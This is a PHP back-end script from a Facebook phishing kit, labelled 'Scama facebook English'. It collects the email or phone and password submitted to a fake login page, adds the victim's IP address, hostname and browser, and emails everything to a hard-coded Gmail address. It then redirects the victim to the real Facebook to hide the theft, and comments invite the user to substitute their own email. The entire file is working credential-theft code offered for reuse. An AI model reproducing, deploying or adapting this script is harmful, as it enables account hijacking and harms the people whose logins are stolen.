<?
  //                      Made And Morocco hhhhhhhhhhhhhhh                     \\
  /*****************************************************************************\
  |                Assalamu Aleikom akhi : Scama facebook English               |
  |                                                                             |   
  |                          Version : 2016-2017                                |
  |                                                                             |
  |         Change This email By Your Email : noureddine.coder@gmail.com        |
  |                                                                             |  
  |       My Channel : https://Youtube.com/channel/UCT_hqoANFtcbOA4o4xZ0iaw     |  
  |                                                                             |  
  |         My Page  : https://www.facebook.com/Nour.blog1                      |
  |                                                                             |
  |       My Website : https://Nourblog1.Blogspot.Com                           |
  |                                                                             |
  \*****************************************************************************/
 
    $ip = getenv("REMOTE_ADDR");
	$message .= "-------------- facebook login  -------------\n";
	$message .= "Email Or Phone : ".$_POST['email']."\n";
	$message .= "Password : ".$_POST['pass']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- By Nourblog1.Blogspot.com ---------\n";
	$subject = "facebook Account | $ip";
	$send = "mohamedlakhder01@gmail.com"; //Put You Email Here
	$headers = 'From: F4ceb00k' . "\r\n";
	mail($send,$subject,$message,$headers);
    header("Location: https://en-us.facebook.com/");?>
